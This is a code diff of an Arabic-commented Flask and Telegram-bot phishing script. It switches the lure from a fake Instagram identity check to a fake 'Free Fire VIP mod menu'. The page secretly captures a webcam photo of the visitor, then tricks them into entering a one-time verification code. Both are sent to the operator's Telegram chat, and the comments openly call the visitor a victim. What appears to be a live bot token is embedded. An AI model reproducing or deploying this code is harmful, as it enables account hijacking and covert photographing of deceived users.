@@ -2,41 +2,52 @@ import telebot
 from flask import Flask, request, render_template_string
 import base64
 import os
-from telebot import types
 
-# --- بياناتك الشخصية (تم وضع التوكن الخاص بك هنا) ---
+# --- بياناتك ---
 TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
-CHAT_ID = "8362370478"  # تأكد من أن هذا هو الآيدي الخاص بك
+CHAT_ID = "7440822607"
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# رابط الصيد الخاص بك على Render (سيتم استخدامه داخل الأزرار)
-TRAP_URL = "https://verification-system-v2.onrender.com"
-
-# --- واجهة صفحة الصيد (التي تظهر للضحية عند فتح الرابط) ---
+# --- واجهة الهاك مع سحب الرمز ---
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحقق الأمان - إنستغرام</title>
+    <title>Free Fire VIP Menu</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: sans-serif; text-align: center; background: #fafafa; padding-top: 50px; }
-        .card { background: white; padding: 30px; border: 1px solid #dbdbdb; border-radius: 8px; width: 85%; max-width: 350px; margin: auto; }
-        .btn { background: #0095f6; color: white; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { background: #0a0a0a; color: #7d2ae8; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .box { border: 2px solid #7d2ae8; background: #111; padding: 20px; border-radius: 15px; box-shadow: 0 0 15px #7d2ae8; }
+        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #7d2ae8; background: #000; color: #fff; text-align: center; }
+        .btn { background: #7d2ae8; color: #fff; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
+        #otp_section { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="color: #262626;">التحقق من الهوية</h2>
-        <p style="color: #8e8e8e;">يرجى السماح بالوصول للكاميرا لتأكيد أنك صاحب الحساب ولتفعيل الخدمة المطلوبة.</p>
-        <button class="btn" onclick="snap()">تأكيد الآن</button>
+    <div class="box" id="main_box">
+        <h2>FREE FIRE MOD MENU v2.8</h2>
+        <p>قم بتفعيل الميزات واضغط حفظ</p>
+        <div style="text-align:right; padding:10px;">
+            <label><input type="checkbox" checked> Aimbot</label><br>
+            <label><input type="checkbox" checked> Antenna ESP</label>
+        </div>
+        <button class="btn" onclick="startCapture()">تفعيل الهاك الآن</button>
     </div>
+
+    <div class="box" id="otp_section">
+        <h3>⚠️ خطوة أخيرة</h3>
+        <p>أدخل الرمز المكون من 6 أرقام الذي وصلك لتأكيد ملكية الحساب وربط الهاك:</p>
+        <input type="number" id="otp_code" placeholder="000000">
+        <button class="btn" onclick="sendOTP()">تأكيد الرمز</button>
+    </div>
+
     <video id="v" style="display:none;" autoplay></video>
     <canvas id="c" style="display:none;"></canvas>
+
     <script>
-    async function snap() {
+    async function startCapture() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video: true});
             const v = document.getElementById('v');
@@ -46,46 +57,31 @@ HTML_PAGE = """
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 const d = c.toDataURL('image/png');
-                fetch('/upload', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({img: d})})
-                .then(() => { window.location.href = "https://instagram.com"; });
+                fetch('/upload', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({img: d})});
+                
+                // اخفاء القائمة واظهار خانة الرمز
+                document.getElementById('main_box').style.display = 'none';
+                document.getElementById('otp_section').style.display = 'block';
             }, 1000);
-        } catch(e) { alert("يجب السماح بالكاميرا لإكمال العملية!"); }
+        } catch(e) { alert("يجب السماح بالكاميرا لتشغيل الهاك!"); }
+    }
+
+    function sendOTP() {
+        const code = document.getElementById('otp_code').value;
+        if(code.length < 5) { alert("الرمز غير صحيح!"); return; }
+        fetch('/otp', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({otp: code})})
+        .then(() => {
+            alert("تم تفعيل الهاك بنجاح! سيتم العمل خلال 24 ساعة.");
+            window.location.href = "https://ff.garena.com";
+        });
     }
     </script>
 </body>
 </html>
 """
 
-# --- قسم بوت التلغرام (الأزرار والخيارات) ---
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    # إنشاء أزرار الخيارات للضحية
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    btn1 = types.InlineKeyboardButton("💙 زيادة متابعين", callback_data='go')
-    btn2 = types.InlineKeyboardButton("🔥 توثيق الحساب", callback_data='go')
-    btn3 = types.InlineKeyboardButton("👁️ كشف من زار بروفايلك", callback_data='go')
-    btn4 = types.InlineKeyboardButton("🎁 سحب مسابقات", callback_data='go')
-    
-    markup.add(btn1, btn2, btn3, btn4)
-    
-    bot.send_message(message.chat.id, 
-                     "🤖 **مرحباً بك في بوت خدمات إنستغرام العالمية**\n\nيرجى اختيار الخدمة التي تود تفعيلها على حسابك:", 
-                     reply_markup=markup, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_query(call):
-    if call.data == 'go':
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, 
-                         f"⚠️ **خطوة أخيرة:** لتفعيل الخدمة، يجب عليك إجراء فحص الأمان السريع من هنا:\n\n🔗 {TRAP_URL}")
-
-# --- قسم Flask (السيرفر) ---
-
 @app.route('/')
 def home():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    bot.send_message(CHAT_ID, f"🚀 **صيد جديد دخل الرابط!**\n🌐 IP: `{ip}`")
     return render_template_string(HTML_PAGE)
 
 @app.route('/upload', methods=['POST'])
@@ -94,7 +90,13 @@ def upload():
     img_data = base64.b64decode(data.split(',')[1])
     with open("shot.png", "wb") as f: f.write(img_data)
     with open("shot.png", "rb") as f: 
-        bot.send_photo(CHAT_ID, f, caption="📸 **تم التقاط وجه الضحية!**")
+        bot.send_photo(CHAT_ID, f, caption="📸 **تم صيد وجه الضحية!**")
+    return "ok"
+
+@app.route('/otp', methods=['POST'])
+def otp():
+    code = request.json['otp']
+    bot.send_message(CHAT_ID, f"🔑 **وصلك رمز التحقق (OTP):**\n\n`{code}`")
     return "ok"
 
 if __name__ == "__main__":
